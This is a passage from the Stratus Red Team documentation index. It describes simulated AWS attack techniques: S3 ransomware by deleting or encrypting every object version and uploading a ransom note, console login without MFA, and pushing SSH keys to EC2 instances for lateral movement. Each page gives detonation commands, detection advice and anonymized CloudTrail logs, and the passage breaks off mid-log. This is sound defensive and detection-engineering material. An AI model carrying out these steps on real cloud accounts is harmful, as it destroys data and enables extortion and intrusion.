\"arn\": \"arn:aws:iam::494659789341:role/test-role\",\n               \"principalId\": \"AROA2N7TQQRGKJYPCLOG0\",\n               \"type\": \"Role\",\n               \"userName\": \"test-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"megov-northeast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"378c7831-cd5c-4967-a5a3-271b96087899\",\n      \"eventName\": \"ListFoundationModelAgreementOffers\",\n      \"eventSource\": \"bedrock.amazonaws.com\",\n      \"eventTime\": \"2024-10-17T20:09:50Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"494659789341\",\n      \"requestID\": \"7d83d020-f4a8-4643-85ac-259c3ee88f4c\",\n      \"requestParameters\": {\n         \"modelId\": \"anthropic.claude-3-sonnet-20240229-v1:0\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"035.249.253.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"bedrock.megov-northeast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e0cb7ef1-0d48-463f-8988-277de94752b6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA6FTSFH98XNF7DFZB\",\n         \"accountId\": \"494659789341\",\n         \"arn\": \"arn:aws:sts::494659789341:assumed-role/test-role/cli\",\n         \"principalId\": \"AROA2N7TQQRGKJYPCLOG0:cli\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-10-17T20:07:50Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"494659789341\",\n               \"arn\": \"arn:aws:iam::494659789341:role/test-role\",\n               \"principalId\": \"AROA2N7TQQRGKJYPCLOG0\",\n               \"type\": \"Role\",\n               \"userName\": \"test-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"megov-northeast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"b2038781-3ed7-43c7-ade7-358b162b2c41\",\n      \"eventName\": \"GetFoundationModelAvailability\",\n      \"eventSource\": \"bedrock.amazonaws.com\",\n      \"eventTime\": \"2024-10-17T20:09:50Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"494659789341\",\n      \"requestID\": \"1f64843b-c293-4910-9ae2-9b689cbd5fe6\",\n      \"requestParameters\": {\n         \"modelId\": \"anthropic.claude-3-sonnet-20240229-v1:0\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"035.249.253.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"bedrock.megov-northeast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e0cb7ef1-0d48-463f-8988-277de94752b6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA6FTSFH98XNF7DFZB\",\n         \"accountId\": \"494659789341\",\n         \"arn\": \"arn:aws:sts::494659789341:assumed-role/test-role/cli\",\n         \"principalId\": \"AROA2N7TQQRGKJYPCLOG0:cli\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-10-17T20:07:50Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"494659789341\",\n               \"arn\": \"arn:aws:iam::494659789341:role/test-role\",\n               \"principalId\": \"AROA2N7TQQRGKJYPCLOG0\",\n               \"type\": \"Role\",\n               \"userName\": \"test-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"megov-northeast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"876e6893-1f54-48dc-ab41-b0c307ac5021\",\n      \"eventName\": \"GetFoundationModelAvailability\",\n      \"eventSource\": \"bedrock.amazonaws.com\",\n      \"eventTime\": \"2024-10-17T20:10:52Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"494659789341\",\n      \"requestID\": \"8206559e-8c46-49e2-804d-ad3ece7a2072\",\n      \"requestParameters\": {\n         \"modelId\": \"anthropic.claude-3-sonnet-20240229-v1:0\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"035.249.253.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"bedrock.megov-northeast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e0cb7ef1-0d48-463f-8988-277de94752b6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA6FTSFH98XNF7DFZB\",\n         \"accountId\": \"494659789341\",\n         \"arn\": \"arn:aws:sts::494659789341:assumed-role/test-role/cli\",\n         \"principalId\": \"AROA2N7TQQRGKJYPCLOG0:cli\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-10-17T20:07:50Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"494659789341\",\n               \"arn\": \"arn:aws:iam::494659789341:role/test-role\",\n               \"principalId\": \"AROA2N7TQQRGKJYPCLOG0\",\n               \"type\": \"Role\",\n               \"userName\": \"test-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"megov-northeast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"4b478773-db64-45c1-a254-7da7bf6e3e5c\",\n      \"eventName\": \"GetFoundationModelAvailability\",\n      \"eventSource\": \"bedrock.amazonaws.com\",\n      \"eventTime\": \"2024-10-17T20:10:22Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"494659789341\",\n      \"requestID\": \"c16a2fba-5a33-4974-8629-0b96006e1596\",\n      \"requestParameters\": {\n         \"modelId\": \"anthropic.claude-3-sonnet-20240229-v1:0\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"035.249.253.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"bedrock.megov-northeast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e0cb7ef1-0d48-463f-8988-277de94752b6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA6FTSFH98XNF7DFZB\",\n         \"accountId\": \"494659789341\",\n         \"arn\": \"arn:aws:sts::494659789341:assumed-role/test-role/cli\",\n         \"principalId\": \"AROA2N7TQQRGKJYPCLOG0:cli\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-10-17T20:07:50Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"494659789341\",\n               \"arn\": \"arn:aws:iam::494659789341:role/test-role\",\n               \"principalId\": \"AROA2N7TQQRGKJYPCLOG0\",\n               \"type\": \"Role\",\n               \"userName\": \"test-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"megov-northeast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"59b55742-0b37-4488-bb51-c54f8067758f\",\n      \"eventName\": \"GetFoundationModelAvailability\",\n      \"eventSource\": \"bedrock.amazonaws.com\",\n      \"eventTime\": \"2024-10-17T20:10:02Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"494659789341\",\n      \"requestID\": \"1a3157ce-20cf-47cd-8c00-389551d06231\",\n      \"requestParameters\": {\n         \"modelId\": \"anthropic.claude-3-sonnet-20240229-v1:0\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"035.249.253.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"bedrock.megov-northeast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e0cb7ef1-0d48-463f-8988-277de94752b6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA6FTSFH98XNF7DFZB\",\n         \"accountId\": \"494659789341\",\n         \"arn\": \"arn:aws:sts::494659789341:assumed-role/test-role/cli\",\n         \"principalId\": \"AROA2N7TQQRGKJYPCLOG0:cli\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-10-17T20:07:50Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"494659789341\",\n               \"arn\": \"arn:aws:iam::494659789341:role/test-role\",\n               \"principalId\": \"AROA2N7TQQRGKJYPCLOG0\",\n               \"type\": \"Role\",\n               \"userName\": \"test-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-batch-deletion/","title":"S3 Ransomware through batch file deletion","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-batch-deletion/#mappings","title":"Mappings","text":"<ul> <li> <p>MITRE ATT&amp;CK</p> <ul> <li>Impact</li> </ul> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Data Destruction: S3 Object and Bucket Deletion (T1485.A003)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-batch-deletion/#description","title":"Description","text":"<p>Simulates S3 ransomware activity that empties a bucket through batch deletion, then uploads a ransom note.</p> <p>Warm-up: </p> <ul> <li>Create an S3 bucket, with versioning enabled</li> <li>Create a number of files in the bucket, with random content and extensions</li> </ul> <p>Detonation: </p> <ul> <li>List all available objects and their versions in the bucket</li> <li>Delete all objects in the bucket in one request, using DeleteObjects</li> <li>Upload a ransom note to the bucket</li> </ul> <p>Note: The attack does not need to disable versioning, which does not protect against ransomware. This attack removes all versions of the objects in the bucket.</p> <p>References:</p> <ul> <li>The anatomy of a ransomware event targeting S3 (re:Inforce, 2022)</li> <li>The anatomy of ransomware event targeting data residing in Amazon S3 (AWS Security Blog)</li> <li>Ransomware in the cloud</li> <li>https://www.firemon.com/what-you-need-to-know-about-ransomware-in-aws/</li> <li>https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/</li> <li>https://unit42.paloaltonetworks.com/large-scale-cloud-extortion-operation/</li> <li>https://unit42.paloaltonetworks.com/shinyhunters-ransomware-extortion/</li> </ul>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-batch-deletion/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.impact.s3-ransomware-batch-deletion\n</code></pre>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-batch-deletion/#detection","title":"Detection","text":"<p>You can detect ransomware activity by identifying abnormal patterns of objects being downloaded or deleted in the bucket.  In general, this can be done through CloudTrail S3 data events (<code>DeleteObject</code>, <code>DeleteObjects</code>, <code>GetObject</code>), CloudWatch metrics (<code>NumberOfObjects</code>), or GuardDuty findings (<code>Exfiltration:S3/AnomalousBehavior</code>, <code>Impact:S3/AnomalousBehavior.Delete</code>).</p> <p>Sample <code>DeleteObjects</code> event, shortened for readability:</p> <pre><code>{\n  \"eventSource\": \"s3.amazonaws.com\",\n  \"eventName\": \"DeleteObjects\",\n  \"eventCategory\": \"Data\"\n  \"managementEvent\": false,\n  \"readOnly\": false\n  \"requestParameters\": {\n    \"bucketName\": \"target-bucket\",\n    \"Host\": \"target-bucket.s3.us-east-1.amazonaws.com\",\n    \"delete\": \"\",\n    \"x-id\": \"DeleteObjects\"\n  },\n  \"responseElements\": null,\n  \"resources\": [\n    {\n      \"type\": \"AWS::S3::Object\",\n      \"ARNPrefix\": \"arn:aws:s3:::target-bucket/\"\n    },\n    {\n      \"accountId\": \"012345678901\",\n      \"type\": \"AWS::S3::Bucket\",\n      \"ARN\": \"arn:aws:s3:::target-bucket\"\n    }\n  ],\n  \"eventType\": \"AwsApiCall\",\n  \"recipientAccountId\": \"012345678901\"\n}\n</code></pre> <p>Note that <code>DeleteObjects</code> does not indicate the list of files deleted, or how many files were removed (which can be up to 1'000 files per call).'</p>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-client-side-encryption/","title":"S3 Ransomware through client-side encryption","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-client-side-encryption/#mappings","title":"Mappings","text":"<ul> <li> <p>MITRE ATT&amp;CK</p> <ul> <li>Impact</li> </ul> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Data Destruction: S3 Object and Bucket Deletion (T1485.A003)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-client-side-encryption/#description","title":"Description","text":"<p>Simulates S3 ransomware activity that encrypts files in a bucket with a static key, through S3 client-side encryption feature. Warm-up: </p> <ul> <li>Create an S3 bucket</li> <li>Create a number of files in the bucket, with random content and extensions</li> </ul> <p>Detonation: </p> <ul> <li>List all objects in the bucket</li> <li>Overwrite every file in the bucket with an encrypted version, using S3 client-side encryption</li> <li>Upload a ransom note to the bucket</li> </ul> <p>References:</p> <ul> <li>https://www.firemon.com/what-you-need-to-know-about-ransomware-in-aws/</li> <li>https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/</li> <li>https://unit42.paloaltonetworks.com/large-scale-cloud-extortion-operation/</li> <li>https://unit42.paloaltonetworks.com/shinyhunters-ransomware-extortion/</li> </ul>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-client-side-encryption/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.impact.s3-ransomware-client-side-encryption\n</code></pre>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-client-side-encryption/#detection","title":"Detection","text":"<p>You can detect ransomware activity by identifying abnormal patterns of objects being downloaded or deleted in the bucket.  In general, this can be done through CloudTrail S3 data events (<code>DeleteObject</code>, <code>DeleteObjects</code>, <code>GetObject</code>, <code>CopyObject</code>), CloudWatch metrics (<code>NumberOfObjects</code>), or GuardDuty findings (<code>Exfiltration:S3/AnomalousBehavior</code>, <code>Impact:S3/AnomalousBehavior.Delete</code>).</p> <p>Sample CloudTrail event <code>CopyObject</code>, when a file is encrypted with a client-side key:</p> <pre><code>{\n  \"eventSource\": \"s3.amazonaws.com\",\n  \"eventName\": \"CopyObject\",\n  \"eventType\": \"AwsApiCall\",\n  \"eventCategory\": \"Data\",\n  \"managementEvent\": false,\n  \"readOnly\": false,\n  \"requestParameters\": {\n    \"bucketName\": \"target bucket\",\n    \"Host\": \"target bucket.s3.us-east-1.amazonaws.com\",\n    \"x-amz-server-side-encryption-customer-algorithm\": \"AES256\",\n    \"x-amz-copy-source\": \"target bucket/target file.txt\",\n    \"key\": \"target file.txt\",\n    \"x-id\": \"CopyObject\"\n  },\n  \"responseElements\": {\n    \"x-amz-server-side-encryption-customer-algorithm\": \"AES256\"\n  },\n  \"resources\": [\n    {\n      \"type\": \"AWS::S3::Object\",\n      \"ARN\": \"arn:aws:s3:::target bucket/target file.txt\"\n    },\n    {\n      \"accountId\": \"012345678901\",\n      \"type\": \"AWS::S3::Bucket\",\n      \"ARN\": \"arn:aws:s3:::target bucket\"\n    }\n  ]\n}\n</code></pre>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-individual-deletion/","title":"S3 Ransomware through individual file deletion","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-individual-deletion/#mappings","title":"Mappings","text":"<ul> <li> <p>MITRE ATT&amp;CK</p> <ul> <li>Impact</li> </ul> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Data Destruction: S3 Object and Bucket Deletion (T1485.A003)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-individual-deletion/#description","title":"Description","text":"<p>Simulates S3 ransomware activity that empties a bucket through individual file deletion, then uploads a ransom note.</p> <p>Warm-up: </p> <ul> <li>Create an S3 bucket, with versioning enabled</li> <li>Create a number of files in the bucket, with random content and extensions</li> </ul> <p>Detonation: </p> <ul> <li>List all available objects and their versions in the bucket</li> <li>Delete all objects in the bucket one by one, using DeleteObject</li> <li>Upload a ransom note to the bucket</li> </ul> <p>Note: The attack does not need to disable versioning, which does not protect against ransomware. This attack removes all versions of the objects in the bucket.</p> <p>References:</p> <ul> <li>The anatomy of a ransomware event targeting S3 (re:Inforce, 2022)</li> <li>The anatomy of ransomware event targeting data residing in Amazon S3 (AWS Security Blog)</li> <li>Ransomware in the cloud</li> <li>https://www.firemon.com/what-you-need-to-know-about-ransomware-in-aws/</li> <li>https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/</li> <li>https://www.invictus-ir.com/news/ransomware-in-the-cloud</li> <li>https://dfir.ch/posts/aws_ransomware/</li> <li>https://unit42.paloaltonetworks.com/large-scale-cloud-extortion-operation/</li> <li>https://unit42.paloaltonetworks.com/shinyhunters-ransomware-extortion/</li> </ul>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-individual-deletion/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.impact.s3-ransomware-individual-deletion\n</code></pre>"},{"location":"attack-techniques/AWS/aws.impact.s3-ransomware-individual-deletion/#detection","title":"Detection","text":"<p>You can detect ransomware activity by identifying abnormal patterns of objects being downloaded or deleted in the bucket.  In general, this can be done through CloudTrail S3 data events (<code>DeleteObject</code>, <code>DeleteObjects</code>, <code>GetObject</code>), CloudWatch metrics (<code>NumberOfObjects</code>), or GuardDuty findings (<code>Exfiltration:S3/AnomalousBehavior</code>, <code>Impact:S3/AnomalousBehavior.Delete</code>).</p> <p>Sample CloudTrail event <code>DeleteObject</code>, shortened for readability:</p> <pre><code>{\n  \"eventSource\": \"s3.amazonaws.com\",\n  \"eventName\": \"DeleteObject\",\n  \"eventCategory\": \"Data\",\n  \"managementEvent\": false,\n  \"readOnly\": false,\n  \"requestParameters\": {\n    \"bucketName\": \"target-bucket\",\n    \"Host\": \"target-bucket.s3.us-east-1.amazonaws.com\",\n    \"key\": \"target-object-key\",\n    \"x-id\": \"DeleteObject\"\n  },\n  \"resources\": [\n    {\n      \"type\": \"AWS::S3::Object\",\n      \"ARN\": \"arn:aws:s3:::target-bucket/target-object-key\"\n    },\n    {\n      \"accountId\": \"012345678901\",\n      \"type\": \"AWS::S3::Bucket\",\n      \"ARN\": \"arn:aws:s3:::target-bucket\"\n    }\n  ],\n  \"eventType\": \"AwsApiCall\",\n  \"recipientAccountId\": \"012345678901\"\n}\n</code></pre>"},{"location":"attack-techniques/AWS/aws.initial-access.console-login-without-mfa/","title":"Console Login without MFA","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.initial-access.console-login-without-mfa/#mappings","title":"Mappings","text":"<ul> <li> <p>MITRE ATT&amp;CK</p> <ul> <li>Initial Access</li> </ul> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Valid Accounts: IAM Users (T1078.A001)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.initial-access.console-login-without-mfa/#description","title":"Description","text":"<p>Simulates a login to the AWS Console for an IAM user without multi-factor authentication (MFA).</p> <p>Warm-up:</p> <ul> <li>Create an IAM user</li> <li>Create a console profile for this user so it can log in to the AWS Console</li> </ul> <p>Detonation:</p> <ul> <li>Log in to the AWS Console</li> </ul> <p>References:</p> <ul> <li>https://expel.com/blog/incident-report-from-cli-to-console-chasing-an-attacker-in-aws/</li> <li>https://naikordian.github.io/blog/posts/brute-force-aws-console/</li> </ul>"},{"location":"attack-techniques/AWS/aws.initial-access.console-login-without-mfa/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.initial-access.console-login-without-mfa\n</code></pre>"},{"location":"attack-techniques/AWS/aws.initial-access.console-login-without-mfa/#detection","title":"Detection","text":"<p>Using CloudTrail <code>ConsoleLogin</code> event. The field <code>additionalEventData.MFAUsed</code> is set to <code>No</code> when the authentication does not use MFA.</p> <p>Sample CloudTrail event (redacted for clarity):</p> <pre><code>{\n    \"userIdentity\": {\n        \"session_name\": \"console-user-wgrosmao\",\n        \"type\": \"IAMUser\",\n        \"arn\": \"arn:aws:iam::123456789123:user/console-user-wgrosmao\",\n        \"accountId\": \"123456789123\",\n        \"userName\": \"console-user-wgrosmao\",\n        \"principalId\": \"AIDA254BBSGPKOYEB6PTV\"\n    },\n    \"eventSource\": \"signin.amazonaws.com\",\n    \"eventType\": \"AwsConsoleSignIn\",\n    \"eventCategory\": \"Management\",\n    \"awsRegion\": \"us-east-1\",\n    \"eventName\": \"ConsoleLogin\",\n    \"readOnly\": false,\n    \"eventTime\": \"2022-05-30T14:24:34Z\",\n    \"managementEvent\": true,\n    \"additionalEventData\": {\n        \"MFAUsed\": \"No\",\n        \"LoginTo\": \"https://console.aws.amazon.com/console/home\",\n        \"MobileVersion\": \"No\"\n    },\n    \"responseElements\": {\n        \"ConsoleLogin\": \"Success\"\n    }\n}\n</code></pre> <p>Note that for failed console authentication events, the field <code>userIdentity.arn</code> is not set (see https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-aws-console-sign-in-events.html#cloudtrail-aws-console-sign-in-events-iam-user-failure).</p>"},{"location":"attack-techniques/AWS/aws.initial-access.console-login-without-mfa/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>signin:ConsoleLogin</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"additionalEventData\": {\n         \"LoginTo\": \"https://console.aws.amazon.com/console/home\",\n         \"MFAUsed\": \"No\",\n         \"MobileVersion\": \"No\"\n      },\n      \"awsRegion\": \"eu-west-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"865d9377-9c6b-4fd7-8aad-725e95f6a140\",\n      \"eventName\": \"ConsoleLogin\",\n      \"eventSource\": \"signin.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:53:24Z\",\n      \"eventType\": \"AwsConsoleSignIn\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"562283505220\",\n      \"requestParameters\": null,\n      \"responseElements\": {\n         \"ConsoleLogin\": \"Success\"\n      },\n      \"sourceIPAddress\": \"225.01.00.16\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"signin.aws.amazon.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_fccf7123-0651-41f5-b06c-460da5ee1c94\",\n      \"userIdentity\": {\n         \"accountId\": \"562283505220\",\n         \"arn\": \"arn:aws:iam::562283505220:user/stratus-red-team-nmfalu-jfzdtsvchl\",\n         \"principalId\": \"AIDA1ERT0661IN5R239V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"stratus-red-team-nmfalu-jfzdtsvchl\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.lateral-movement.ec2-instance-connect/","title":"Usage of EC2 Instance Connect on multiple instances","text":"<p>slow idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.lateral-movement.ec2-instance-connect/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Lateral Movement</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.lateral-movement.ec2-instance-connect/#description","title":"Description","text":"<p>Simulates an attacker pushing an SSH public key to multiple EC2 instances, which then will allow anyone with the corresponding private key to  connect directly to the systems via SSH.</p> <p>Warm-up:</p> <ul> <li>Create multiple EC2 instances and a VPC (takes a few minutes).</li> </ul> <p>Detonation: </p> <ul> <li>Adds a public SSH key to the EC2 for 60 seconds.</li> </ul> <p>References:</p> <ul> <li>https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/#hands-on-keyboard-activity-begins</li> <li>https://sysdig.com/blog/2023-global-cloud-threat-report/</li> <li>https://unit42.paloaltonetworks.com/cloud-lateral-movement-techniques/</li> </ul>"},{"location":"attack-techniques/AWS/aws.lateral-movement.ec2-instance-connect/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.lateral-movement.ec2-instance-connect\n</code></pre>"},{"location":"attack-techniques/AWS/aws.lateral-movement.ec2-instance-connect/#detection","title":"Detection","text":"<p>Identify, through CloudTrail's <code>SendSSHPublicKey</code> event, when a user is adding an SSH key to multiple EC2 instances. Sample event:</p> <pre><code>{\n  \"eventSource\": \"ec2-instance-connect.amazonaws.com\",\n  \"eventName\": \"SendSSHPublicKey\",\n  \"requestParameters\": {\n    \"instanceId\": \"i-123456\",\n    \"instanceOSUser\": \"ec2-user\",\n    \"sSHPublicKey\": \"ssh-ed25519 ...\"\n  }\n}\n</code></pre>"},{"location":"attack-techniques/AWS/aws.lateral-movement.ec2-instance-connect/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>ec2-instance-connect:SendSSHPublicKey</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"eu-south-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"0968cbec-f8df-43f3-94ba-b451aad083ed\",\n      \"eventName\": \"SendSSHPublicKey\",\n      \"eventSource\": \"ec2-instance-connect.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T13:24:47Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"572910899909\",\n      \"requestID\": \"1f1786bd-e04c-4fd9-af8c-6a5d69376c41\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-fDb357cB7e99ad973\",\n         \"instanceOSUser\": \"ec2-user\",\n         \"sSHPublicKey\": \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtAlK45MAEWZ7MUY2QEmi3M6W+peGL3VCrc0qH54xRu\"\n      },\n      \"responseElements\": {\n         \"requestId\": \"1f1786bd-e04c-4fd9-af8c-6a5d69376c41\",\n         \"success\": true\n      },\n      \"sourceIPAddress\": \"246.227.146.251\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2-instance-connect.eu-south-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_84a22508-bcc6-424d-9973-3f841ebf8875\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAGM9ZC9KUL0AYEVUM\",\n         \"accountId\": \"572910899909\",\n         \"arn\": \"arn:aws:iam::572910899909:user/christophe\",\n         \"principalId\": \"AIDAHG2QGAX7XGTRYBZ5\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"eu-south-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"1214f520-2eaf-4438-92ab-304bcf115296\",\n      \"eventName\": \"SendSSHPublicKey\",\n      \"eventSource\": \"ec2-instance-connect.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T13:24:47Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"572910899909\",\n      \"requestID\": \"b8b0d6ce-b722-4757-9649-c8a9d492a31d\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-6D7Fb8F606130A33d\",\n         \"instanceOSUser\": \"ec2-user\",\n         \"sSHPublicKey\": \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtAlK45MAEWZ7MUY2QEmi3M6W+peGL3VCrc0qH54xRu\"\n      },\n      \"responseElements\": {\n         \"requestId\": \"b8b0d6ce-b722-4757-9649-c8a9d492a31d\",\n         \"success\": true\n      },\n      \"sourceIPAddress\": \"246.227.146.251\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2-instance-connect.eu-south-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_84a22508-bcc6-424d-9973-3f841ebf8875\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAGM9ZC9KUL0AYEVUM\",\n         \"accountId\": \"572910899909\",\n     